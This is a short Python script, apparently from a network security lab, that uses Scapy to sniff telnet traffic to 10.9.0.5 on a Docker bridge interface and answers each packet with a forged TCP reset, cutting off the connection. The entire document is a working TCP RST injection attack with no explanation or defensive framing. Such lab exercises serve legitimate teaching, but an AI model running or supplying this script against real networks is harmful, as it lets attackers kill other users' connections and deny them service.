#!/usr/bin/env python3
from scapy.all import *

def spoof_rst(pkt2):
    ip = IP(src=pkt2[IP].dst, dst=pkt2[IP].src)
    tcp = TCP(sport=pkt2[TCP].dport, dport=pkt2[TCP].sport, flags="R", seq=pkt2[TCP].ack)
    pkt = ip/tcp
    pkt.show()
    send(pkt,verbose=0)

pkt = sniff(iface='br-38222afe7e99',filter='tcp and dst host 10.9.0.5 and dst port 23',prn=spoof_rst)
